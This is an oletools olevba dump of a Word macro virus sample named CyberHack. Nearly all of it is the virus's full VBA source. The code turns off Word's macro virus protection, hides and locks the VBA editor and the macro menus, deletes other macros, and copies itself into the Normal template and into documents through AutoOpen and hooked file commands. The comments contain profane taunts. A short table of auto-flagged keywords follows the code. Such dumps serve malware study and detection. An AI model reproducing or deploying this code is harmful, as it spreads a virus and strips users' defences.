olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CyberHack-based-917c8e5a5821141de298709d5fe13cad5b452361
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CyberHack-based-917c8e5a5821141de298709d5fe13cad5b452361 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SmartmanHack.bas 
in file: Virus.MSWord.CyberHack-based-917c8e5a5821141de298709d5fe13cad5b452361 - OLE stream: 'Macros/VBA/SmartmanHack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Anda para pembuat virus memang
' GATEL
' KUNAM
' DIANCUK
' BANGSAT
'
' INI BARU HACKER....LET'S GO PORN PAL!!!
'
Public AlAsal
Public DokSave
Public Norok
Public Dokok
Sub CyInit()
    AlAsal = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Tahan
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub
Sub CyClose()
Application.DisplayAlerts = AlAsal
End Sub
Sub Dok2Nor()
    Call Tahan
    On Error GoTo Erw1
    Norok = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh1a
    For i = 1 To NT.VBProject.VBComponents.Count
      NMacr = NT.VBProject.VBComponents(i).Name
      If NMacr = "SmartmanHack" Then Norok = True
      If (NMacr <> "SmartmanHack") And (NMacr <> "SmartmanForm") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=NT.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh1a:
    If Norok = False Then
      On Error GoTo Erh1
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "SmartmanHack", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "SmartmanForm", Object:=wdOrganizerObjectProjectItems
      Templates(NT.FullName).Save
Erh1:
    End If
Erw1:
End Sub
Sub Nor2Dok()
    On Error GoTo Erw2
    DokSave = 0
    Dokok = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh2a
    For i = 1 To AD.VBProject.VBComponents.Count
      NMacr = AD.VBProject.VBComponents(i).Name
      If NMacr = "SmartmanHack" Then Dokok = True
      NMacr = NT.VBProject.VBComponents(i).Name
      If NMacr = "SmartmanHack" Then Dokok = True
      If (NMacr <> "SmartmanHack") And (NMacr <> "SmartmanForm") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=AD.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh2a:
    If Dokok = False Then
      On Error GoTo Erh2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "SmartmanHack", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "SmartmanForm", Object:=wdOrganizerObjectProjectItems
      DokSave = 1
Erh2:
    End If
Erw2:
End Sub
Sub Smartman()
    Call CyInit
    Call Dok2Nor
    Call CyClose
End Sub
Sub Tahan()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Simpan()
    On Error GoTo Erh4
Set AD = ActiveDocument
    If DokSave = 1 Then
       AD.SaveAs FileName:=AD.Name, FileFormat:=wdFormatDocument
    End If
Erh4:
End Sub
Sub AutoOpen()
    Call Smartman
End Sub
Sub FileClose()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    WordBasic.FileClose
End Sub
Sub FileOpen()
    Call Smartman
    Dialogs(wdDialogFileOpen).Show
    Call CyInit
    Call Nor2Dok
    Call Simpan
    Call CyClose
End Sub
Sub FileSaveAs()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    On Error GoTo Errh1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Errh1:
End Sub
Sub HelpAbout()
    On Error GoTo Erw3
    SmartmanForm.Show
Erw3:
End Sub
Sub FileExit()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    On Error GoTo Erw4
    If WeekDay(Date) = 6 Then SmartmanForm.Show
Erw4:
    Call CyClose
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call Smartman
End Sub
Sub FileNew()
    Call Smartman
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
    Call Smartman
End Sub
Sub ToolsMacro()
    Call Smartman
End Sub
Sub ToolsCustomize()
    Call Smartman
End Sub
Sub ToolsCustomizeKeyboard()
    Call Smartman
End Sub
Sub ViewVBCode()
    Call Smartman
End Sub
Sub Organizer()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

